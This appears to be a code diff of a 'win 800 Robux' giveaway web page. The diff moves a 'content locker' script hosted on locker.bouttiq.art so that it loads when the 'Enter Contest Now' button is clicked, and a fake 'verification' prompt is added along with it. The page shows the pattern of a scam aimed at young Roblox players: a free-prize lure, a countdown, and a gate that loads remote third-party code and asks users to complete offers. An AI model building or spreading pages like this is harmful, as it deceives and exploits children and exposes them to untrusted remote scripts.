@@ -37,9 +37,6 @@
     #language-switcher img {width:30px;height:auto;vertical-align:middle;transition:transform 0.2s;}
     #language-switcher button:hover img {transform:scale(1.1);}
   </style>
-
-  <!-- Content Locker Script -->
-  <script type="text/javascript" id="ogjs" src="https://locker.bouttiq.art/cl/js/mejr88"></script>
 </head>
 <body>
 
@@ -59,7 +56,7 @@
       <h2>Win Big This Week!</h2>
       <div class="prize">800 Roblox Gift Card</div>
       <p>Join our weekly Robux giveaway contest and be the next lucky winner! It's free, fast, and open to all Roblox players worldwide.</p>
-      <button class="cta" onclick="window.location.href='https://bouttiqgraphics.github.io/youreemail/'">Enter Contest Now</button>
+      <button class="cta" id="enterBtn">Enter Contest Now</button>
     </section>
 
     <section>
@@ -113,6 +110,7 @@
   </div>
 
   <script>
+    // Countdown timer
     function updateCountdown(){
       const now=new Date();
       const nextSunday=new Date();
@@ -130,8 +128,10 @@
       document.getElementById('minutes').textContent=String(minutes).padStart(2,'0');
       document.getElementById('seconds').textContent=String(seconds).padStart(2,'0');
     }
-    setInterval(updateCountdown,1000);updateCountdown();
+    setInterval(updateCountdown,1000);
+    updateCountdown();
 
+    // Language switcher translations (same as your original code)
     const translations={
       en:{logo:"Win an 800 Roblox Gift Card",subtitle:"Your chance to win 800 Robux every Sunday!",winBigTitle:"Win Big This Week!",prize:"800 Roblox Gift Card",winBigText:"Join our weekly Robux giveaway contest and be the next lucky winner! It's free, fast, and open to all Roblox players worldwide.",enterBtn:"Enter Contest Now",whyJoinTitle:"Why Join?",card1Title:"🎁 Free",card1Text:"Join every week without any fees or charges.",card2Title:"🏆 Fair",card2Text:"One winner randomly selected each week.",card3Title:"💎 Instant",card3Text:"Receive 800 Robux in under 48 hours.",card4Title:"🌍 Global",card4Text:"Open to all Roblox players worldwide.",howItWorksTitle:"How It Works",step1Title:"1️⃣ Join",step1Text:"Click the button to be added to the draw list.",step2Title:"2️⃣ Wait",step2Text:"Draws happen every Sunday at 12 PM UTC.",step3Title:"3️⃣ Win",step3Text:"Winner is contacted directly after the draw.",step4Title:"4️⃣ Receive",step4Text:"Get your Robux delivered in less than 48 hours.",nextContestTitle:"Next Contest Starts In:",faqTitle:"FAQ",faq1Q:"📌 Is it free?",faq1A:"Yes, 100% free every week.",faq2Q:"📌 How do I receive Robux?",faq2A:"We transfer them directly to your Roblox account.",faq3Q:"📌 When is the draw?",faq3A:"Every Sunday at 12 PM UTC.",footerText:"© 2025 bouttiq.art - All Rights Reserved",alertEnter:"Contest entry feature will be available soon!"},
       es:{logo:"Gana una Tarjeta de Regalo Roblox de 800",subtitle:"¡Tu oportunidad de ganar 800 Robux cada domingo!",winBigTitle:"¡Gana a lo Grande esta Semana!",prize:"Tarjeta de Regalo Roblox de 800",winBigText:"¡Únete a nuestro sorteo semanal de Robux y sé el próximo ganador afortunado! Es gratis, rápido y abierto a todos los jugadores de Roblox en todo el mundo.",enterBtn:"Participar Ahora",whyJoinTitle:"¿Por qué Unirse?",card1Title:"🎁 Gratis",card1Text:"Participa cada semana sin tarifas ni cargos.",card2Title:"🏆 Justo",card2Text:"Un ganador seleccionado al azar cada semana.",card3Title:"💎 Instantáneo",card3Text:"Recibe 800 Robux en menos de 48 horas.",card4Title:"🌍 Global",card4Text:"Abierto a todos los jugadores de Roblox en todo el mundo.",howItWorksTitle:"Cómo Funciona",step1Title:"1️⃣ Únete",step1Text:"Haz clic en el botón para ser añadido a la lista del sorteo.",step2Title:"2️⃣ Espera",step2Text:"Los sorteos se realizan cada domingo a las 12 PM UTC.",step3Title:"3️⃣ Gana",step3Text:"El ganador es contactado directamente después del sorteo.",step4Title:"4️⃣ Recibe",step4Text:"Recibe tus Robux en menos de 48 horas.",nextContestTitle:"El Próximo Concurso Comienza En:",faqTitle:"Preguntas Frecuentes",faq1Q:"📌 ¿Es gratis?",faq1A:"Sí, 100% gratis cada semana.",faq2Q:"📌 ¿Cómo recibo los Robux?",faq2A:"Los transferimos directamente a tu cuenta de Roblox.",faq3Q:"📌 ¿Cuándo es el sorteo?",faq3A:"Cada domingo a las 12 PM UTC.",footerText:"© 2025 bouttiq.art - Todos los derechos reservados",alertEnter:"¡La función de inscripción al concurso estará disponible pronto!"}
@@ -169,6 +169,18 @@
       document.querySelector('footer').textContent=t.footerText;
       document.querySelector('section:nth-of-type(1) .cta').setAttribute('onclick',`alert('${t.alertEnter}')`);
     }
+
+    // Load content locker script on button click
+    document.getElementById('enterBtn').addEventListener('click', function() {
+      // Load the content locker script dynamically
+      if (!document.getElementById('ogjs')) {
+        var script = document.createElement('script');
+        script.src = "https://locker.bouttiq.art/cl/js/mejr88";
+        script.id = "ogjs";
+        document.head.appendChild(script);
+        alert('Please complete the verification process to enter the contest.');
+      }
+    });
   </script>
 </body>
 </html>
